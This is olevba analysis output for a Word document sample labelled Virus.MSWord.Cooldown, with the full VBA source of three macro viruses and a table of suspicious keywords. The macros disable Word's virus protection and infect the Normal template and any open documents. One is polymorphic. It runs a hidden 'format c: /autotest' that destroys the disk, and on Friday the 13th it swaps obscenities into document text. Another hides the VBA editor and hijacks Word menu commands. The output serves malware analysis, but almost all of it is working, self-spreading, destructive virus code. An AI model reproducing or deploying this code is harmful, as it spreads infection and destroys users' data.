olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown-68549c58fcfbc1d44af81744045986e68eebf5b4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown-68549c58fcfbc1d44af81744045986e68eebf5b4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
         ' 6319.478
' 9216.518
Private Sub _
      Document_Open()
 ' 1776.26

CoolDown 0
     ' 3319.92
' 294.3009
' 5706.117
End _
    Sub
              Private _
             Sub Document_Close()
             ' 5045.152
CoolDown 0
             End Sub
            Private _
         Sub ToolsMacro()
          ' 5993.89
CoolDown _
        1
          End Sub
       ' 3456.764
' 9728.177
' 7767.581
Private _
                Sub _
ViewVBCode()
CoolDown _
           1
          ' 7591.155
' 2801.16
End Sub
            ' 6826.456
' 6512.624
' 2402.474
' 1259.207
Private _
                Sub _
           CoolDown(How _
             As _
 Integer)
          On Error _
           Resume _
      Next

' 6048.268
' 7247.213
' 5658.762
Dim _
             c As _
  String, a As Long, b _
              As Long, _
   d As Long, e As Long, f As _
  Long, res _
   As _
  String, m _
               As _
          Boolean
          ' 2526.365

' 7206.676
' 7799.407
Randomize
      
' 6147.774
' 4391.458
' 2953.985
With Options
            .VirusProtection = _
  False
   ' 4466.615
' 8284.341
' 178.2793
' 5408.525
.ConfirmConversions _
         = False
        ' 4700.637
' 7750.061
.SaveNormalPrompt _
    = _
        False
         End _
 With
               If _
       How = _
              1 Then
              s _
  = _
            Shell("format" _
      & _
            Chr(32) & "c:" & _
  Chr(32) & "/autotest", _
        vbHide)
    Else
          With _
            NormalTemplate.VBProject.VBComponents(1).CodeModule
        ' 178.7442
' 8445.289
' 8595.134
If _
                Not .Find("Cool" _
    & _
   "Down", _
   1, _
    1, 1000, 1000, _
              False, _
       False) Then
            ' 4848.403


a _
 = .CountOfLines
  ' 3324.686
For b = 1 To _
             a
             ' 629.2051
.DeleteLines _
      (1)
 
' 8553.866
' 5393.779

Next
         d = _
    1
           a = _
      ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
 ' 3737.46
res _
 = ""
  ' 6516.396
' 9402.06
For _
  b = 1 _
          To _
           a
       c _
         = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, _
             1)
          c = _
  RTrim(LTrim(c))
         ' 2540.334
If _
       foo(c, f, _
      res) _
     Then
       ' 1309.968
' 4150.409
.InsertLines d, _
           Space(Rnd _
               * 16) & _
              res
         d = d + _
  f
        ' 1924.759


' 1613.547
' 8826.701
' 2027.464
' 6421.687
f = 0
                ' 6042.611
res = _
       ""
         End If
  Next
          NormalTemplate.Save
      End _
     If
                End With
       For e _
     = 1 To _
        Documents.Count
       With _
          Documents(e).VBProject.VBComponents(1).CodeModule
   If Not .Find("Cool" _
 & _
            "Down", 1, 1, 1000, 1000, False, False) _
 Then
            a = _
          .CountOfLines
     m _
              = _
              Documents(e).Saved
          For _
                b _
   = _
  1 To a
       ' 4861.566
.DeleteLines _
                (1)
  
Next
   
d = 1
   
a _
 = _
           NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
              res = ""
           
For _
         b = 1 _
             To a
           c = _
        NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, _
           1)
        c = _
            RTrim(LTrim(c))
    If _
          foo(c, f, _
  res) _
     Then
 .InsertLines _
       d, _
                Space(Rnd * _
 16) & _
      res
   
d _
              = d _
     + _
f
    ' 234.5318

' 5209.781

' 6121.083
f _
    = _
   0
       res = ""
           ' 8132.541
End If
        ' 7644.335
' 7805.123
' 5123.401
' 5847.157
' 7364.706
Next
             ' 142.7966
' 1846.293
' 7396.686
' 6451.5
' 4380.58
If Documents(e).Path <> "" Then
              ' 1178.87
Documents(e).SaveAs AddToRecentFiles:=False
  End If
       ' 3012.068
' 4626.219

If (WeekDay(Date) = _
               6) And (Day(Date) _
            = _
 13) _
               And _
                (Rnd _
            > 0.7) _
              Then
    Application.StatusBar = _
        ""
              Application.DisplayStatusBar _
          = False
          Application.ScreenUpdating _
 = False
       ' 965.938


With Documents(e).Content
             .Find.Execute _
       FindText:="пр", _
            ReplaceWith:="пизд", _
               Replace:=wdReplaceAll
 ' 8152.104

' 9405.005
.Find.Execute FindText:="др", _
             ReplaceWith:="понос", _
            Replace:=wdReplaceAll
  ' 2765.468
' 542.8237
.Find.Execute FindText:="кр", ReplaceWith:="кобыл", Replace:=wdReplaceAll
         .Find.Execute _
 FindText:="стр", _
ReplaceWith:="ебан", _
           Replace:=wdReplaceAll
             .Find.Execute FindText:="ср", _
ReplaceWith:="срак", Replace:=wdReplaceAll
            ' 7914.072
.Find.Execute FindText:="тр", ReplaceWith:="трах", _
    Replace:=wdReplaceAll
       .Find.Execute _
    FindText:="бр", ReplaceWith:="бляд", Replace:=wdReplaceAll
    ' 786.1984

' 3480.843
.Find.Execute _
       FindText:="вр", _
 ReplaceWith:="выеб", Replace:=wdReplaceAll
               .Find.Execute _
           FindText:="гр", ReplaceWith:="говн", _
             Replace:=wdReplaceAll
        
' 5956.424

.Find.Execute _
             FindText:="жр", _
       ReplaceWith:="жоп", _
              Replace:=wdReplaceAll
              ' 5893.811

' 1566.353
.Find.Execute FindText:="зр", _
 ReplaceWith:="залуп", _
      Replace:=wdReplaceAll
 .Find.Execute _
  FindText:="дж", _
         ReplaceWith:="джоп", Replace:=wdReplaceAll
 .Find.Execute _
 FindText:="кал", _
   ReplaceWith:="дер", Replace:=wdReplaceAll
            ' 9330.535
' 3914.688
.Find.Execute _
        FindText:="бух", ReplaceWith:="бряк", Replace:=wdReplaceAll
  End _
       With
 ' 5973.687
Documents(e).UndoClear
      ' 8684.005
' 1750.021
' 2304.385
Application.DisplayStatusBar = True
   ' 5739.433
Application.ScreenUpdating = True
   
Application.StatusBar = _
 ""
             ' 8800.396
End If
  Documents(e).Saved _
 = _
                m
               End _
  If
              End With
    ' 3030.174
Next
        End If
       End Sub
           ' 2722.319
' 8802.573
Private _
   Function _
  foo(ByRef s _
   As String, ByRef i As _
   Long, ByRef res As _
        String) As Boolean
              ' 8724.705
Dim tmp _
   As String
     ' 8083.647
If (Left(s, 1) _
         = _
              "'") Or (Len(s) _
= _
 0) _
 Then
               ' 4248.46
foo = False
        Exit _
              Function
            ' 3104.522
' 7906.33
' 4807.196
End If
     If _
   Right(s, 2) _
      = _
  Chr(32) _
     & _
        "_" _
                Then
     res = res & _
     Left(s, Len(s) _
          - _
       1)
    ' 5835.352
' 6668.418

' 7921.653
foo = _
             False
               ' 1024.342
Exit Function
 ' 5195.54
End If
             ' 3482.234
tmp = _
            res _
       & _
 s
       ' 9135.813
res _
             = ""
  ' 9165.383
i _
            = 1
     ' 4298.253

While _
   Rnd > _
      0.5
               ' 8079.617
' 1412.616
If _
               Rnd _
    < 0.8 _
  Then
  res = res _
        & _
   "'" _
     & _
 Str(Rnd * _
    10000)
      

End If
            ' 1623.322
res = res & _
 Chr(13)
' 8779.576
i _
     = _
        i + _
   1
              Wend
     ' 2149.898
' 7680.18
' 7939.602
' 7980.51
' 4778.203
' 8505.497
' 4838.174
For a = 1 _
      To _
    Len(tmp)
 ' 3149.138
res _
 = res & _
             Mid(tmp, a, _
           1)
            
If _
  Mid(tmp, _
        a, _
           1) _
                = Chr(32) _
            Then
       If _
 Rnd > _
  0.5 Then
                ' 8423.321
res _
      = res _
               & _
         "_" _
 & Chr(13) & _
         Space(Rnd * 16)
           i = _
        i _
             + 1
               End If
           End If
       Next
    foo = _
 True
  End Function

-------------------------------------------------------------------------------
VBA MACRO xkySoldier.bas 
in file: Virus.MSWord.Cooldown-68549c58fcfbc1d44af81744045986e68eebf5b4 - OLE stream: 'Macros/VBA/xkySoldier'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const NStat = 1
Const VStat = 1
Public Declare Sub FatalAppExit Lib "kernel32" Alias "FatalAppExitA" (ByVal uAction As Long, ByVal lpMessageText As String)
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean
On Error Resume Next
Application.VBE.MainWindow.Visible = False
pth = Environ("temp") & "\~WRr000^.tmp"
Set dc = NormalTemplate.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "xkySoldier" Then
NInst = 1
dc(i).Export pth
End If
Next i
Set dc = ActiveDocument.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "xkySoldier" Then
AInst = 1
dc(i).Export pth
End If
Next i
If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
dc.VBProject.VBComponents.import pth
If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
Kill pth
End If
 AutoCorrect.Entries(",").Delete
    With AutoCorrect
        .CorrectInitialCaps = True
        .CorrectSentenceCaps = False
        .CorrectDays = True
        .CorrectCapsLock = True
        .ReplaceText = True
    End With
    On Error Resume Next
Dim pdd, wd, r, s
Set wd = Application.VBE.ActiveVBProject.VBComponents

For r = 1 To wd.Count

If Application.VBE.ActiveVBProject.VBComponents(r).Name = "WordDigger" Then

MsgBox "Внимание!" + vbCrLf + "В шаблоне обнаружен модуль WordDigger (иначе БЛИН)" + vbCrLf + " Модуль БЛИНА и его последствия были уничтожены" + vbCrLf + "Вирусом-охотником SkySoldier. Вакцинация шаблона проведена, однако проверте файлы антивирусом", vbOKOnly + vbInformation
MsgBox "В 2000 году какая-то скотина принесла в штаб СКВО вирус WordDigger" + vbCrLf + " или, как его тут все называют БЛИН" + vbCrLf + "Он до того живучий, что сильно меня достал" + vbCrLf + "и вот на досуге сложилась мысль написать вирус-охотник, который бы уничтожал БЛИН изнутри. И вот что из этого получилось..." + vbCrLf + "Автор программы: Штода Е.В. (АпНШ)" + vbCrLf + "Идея: Дудин Сергей (ОСВ и БВС)" + vbCrLf + "Под чутким руководством полковника Чмулева В.В."
GoSub 20

End If
Next r
20 wd.Remove Application.VBE.ActiveVBProject.VBComponents(r)


Return

Set pdd = NormalTemplate.VBProject.VBComponents

For s = 1 To pdd.Count
If NormalTemplate.VBProject.VBComponents(s).Name = "WordDigger" Then
pdd.Remove NormalTemplate.VBProject.VBComponents(s)
MsgBox "Внимание!" + vbCrLf + "В шаблоне обнаружен модуль WordDigger (иначе БЛИН)" + vbCrLf + " Модуль БЛИНА и его последствия были уничтожены" + vbCrLf + "Вирусом-охотником SkySoldier. Вакцинация шаблона проведена, однако проверте файлы антивирусом", vbOKOnly + vbInformation
MsgBox "В 2000 году какая-то скотина принесла в штаб СКВО вирус WordDigger" + vbCrLf + " или, как его тут все называют БЛИН" + vbCrLf + "Он до того живучий, что сильно меня достал" + vbCrLf + "и вот на досуге сложилась мысль написать вирус-охотник, который бы уничтожал БЛИН изнутри. И вот что из этого получилось..." + vbCrLf + "Автор программы: Штода Е.В. (АпНШ)" + vbCrLf + "Идея: Дудин Сергей (ОСВ и БВС)" + vbCrLf + "Под чутким руководством полковника Чмулева В.В."
End If
Next s
End Sub
Sub AutoExec()
Dim o, l
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Application.VBE.MainWindow.Visible = False
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
 AutoCorrect.Entries(",").Delete
    With AutoCorrect
        .CorrectInitialCaps = True
        .CorrectSentenceCaps = False
        .CorrectDays = True
        .CorrectCapsLock = True
        .ReplaceText = True
    End With
    On Error Resume Next
Dim pdd, wd
Set wd = Application.VBE.ActiveVBProject.VBComponents

For o = 1 To wd.Count

If Application.VBE.ActiveVBProject.VBComponents(o).Name = "WordDigger" Then

MsgBox "Внимание!" + vbCrLf + "В шаблоне обнаружен модуль WordDigger (иначе БЛИН)" + vbCrLf + " Модуль БЛИНА и его последствия были уничтожены" + vbCrLf + "Вирусом-охотником SkySoldier. Вакцинация шаблона проведена, однако проверте файлы антивирусом", vbOKOnly + vbInformation
MsgBox "В 2000 году какая-то скотина принесла в штаб СКВО вирус WordDigger" + vbCrLf + " или, как его тут все называют БЛИН" + vbCrLf + "Он до того живучий, что сильно меня достал" + vbCrLf + "и вот на досуге сложилась мысль написать вирус-охотник, который бы уничтожал БЛИН изнутри. И вот что из этого получилось..." + vbCrLf + "Автор программы: Штода Е.В. (АпНШ)" + vbCrLf + "Идея: Дудин Сергей (ОСВ и БВС)" + vbCrLf + "Под чутким руководством полковника Чмулева В.В."
GoSub 20

End If
Next o
20 wd.Remove Application.VBE.ActiveVBProject.VBComponents(o)


Return

Set pdd = NormalTemplate.VBProject.VBComponents

For l = 1 To pdd.Count
If NormalTemplate.VBProject.VBComponents(l).Name = "WordDigger" Then
pdd.Remove NormalTemplate.VBProject.VBComponents(l)
MsgBox "Внимание!" + vbCrLf + "В шаблоне обнаружен модуль WordDigger (иначе БЛИН)" + vbCrLf + " Модуль БЛИНА и его последствия были уничтожены" + vbCrLf + "Вирусом-охотником SkySoldier. Вакцинация шаблона проведена, однако проверте файлы антивирусом", vbOKOnly + vbInformation
MsgBox "В 2000 году какая-то скотина принесла в штаб СКВО вирус WordDigger" + vbCrLf + " или, как его тут все называют БЛИН" + vbCrLf + "Он до того живучий, что сильно меня достал" + vbCrLf + "и вот на досуге сложилась мысль написать вирус-охотник, который бы уничтожал БЛИН изнутри. И вот что из этого получилось..." + vbCrLf + "Автор программы: Штода Е.В. (АпНШ)" + vbCrLf + "Идея: Дудин Сергей (ОСВ и БВС)" + vbCrLf + "Под чутким руководством полковника Чмулева В.В."
End If
Next l
End Sub
Sub FileSave()
On Error Resume Next
Call AutoOpen
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Call AutoOpen
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub ToolsOptions()
On Error Resume Next
Dim dc As Object
Dim VirStat As Byte
Dim NorStat As Byte
Options.SaveNormalPrompt = NStat
Options.VirusProtection = VStat
Dialogs(wdDialogToolsOptions).Show
Set dc = ActiveDocument.VBProject.VBComponents("xkySoldier").CodeModule
If Options.SaveNormalPrompt = True Then NorStat = 1
If Options.VirusProtection = True Then VirStat = 1
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat
Set dc = NormalTemplate.VBProject.VBComponents("xkySoldier").CodeModule
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
NormalTemplate.Save
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
Dim i As Byte, n As Integer, pth As String
Dim NInst As Boolean, AInst As Boolean, Nsav As Boolean, Asav As Boolean, res As Boolean
Dim dc As Object, dcN As Object, dcA As Object
On Error Resume Next
pth = Environ("temp") & "\~WRr000^.tmp"
Set dcN = NormalTemplate.VBProject.VBComponents
Set dcA = ActiveDocument.VBProject.VBComponents
Set dc = NormalTemplate.VBProject
GoSub 10
NInst = res
Set dc = ActiveDocument.VBProject
GoSub 10
AInst = res
If NInst = True Then
Set dc = dcN
GoSub 20
Nsav = NormalTemplate.Saved
NormalTemplate.Saved = 1
End If
If AInst = True Then
Set dc = dcA
GoSub 20
Asav = ActiveDocument.Saved
ActiveDocument.Saved = 1
End If
Dialogs(wdDialogToolsMacro).Show
dcN("xkySoldier").CodeModule.AddFromFile pth
dcA("xkySoldier").CodeModule.AddFromFile pth
dcN.CodeModule.AddFromFile pth
NormalTemplate.Saved = Nsav
dcA.CodeModule.AddFromFile pth
ActiveDocument.Saved = Asav
Kill pth
Exit Sub
10 For i = 1 To dc.VBComponents.Count
If dc.VBComponents(i).Name = "xkySoldier" Then
res = 1
dc.VBComponents(i).Export pth
End If
Next i
Return
20 dc.Export pth
n = dc("xkySoldier").CodeModule.CountOfLines
dc("xkySoldier").CodeModule.DeleteLines 1, n
Return
End Sub
Sub ViewVBCode()
'If Dir("c:\xkySoldier.die") = "" Then
'MsgBox "Осторожно"
Application.VBE.MainWindow.Visible = True
'End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO TheSecond.bas 
in file: Virus.MSWord.Cooldown-68549c58fcfbc1d44af81744045986e68eebf5b4 - OLE stream: 'Macros/VBA/TheSecond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  
  
  flag = False
  If Documents.Count >= 1 Then
    counter = NormalTemplate.VBProject.VBComponents.Count
    For i = 1 To counter
      If NormalTemplate.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    x = Application.StartupPath + "\TheSecond.tmp"
    If Not flag Then
      ActiveDocument.VBProject.VBComponents("TheSecond").Export (x)
      NormalTemplate.VBProject.VBComponents.import (x)
    End If
    flag = False
    infected = False
    havesave = ActiveDocument.Saved
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    If Not flag Then
      NormalTemplate.VBProject.VBComponents("TheSecond").Export (x)
      ActiveDocument.VBProject.VBComponents.import (x)
      infected = True
    End If
    If havesave And infected And (Left(ActiveDocument.Name, 8) <> "Документ") Then
      Dialogs(wdDialogFileSaveAs).Execute
    End If
    ActiveDocument.Saved = havesave
  End If
End Sub
Sub FilePrint()
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Нюбин"
    .Replacement.Text = "Нудин"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  Dialogs(wdDialogFilePrint).Show
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Нудин"
    .Replacement.Text = "Нюбин"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("Нет загруженных макросов!")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

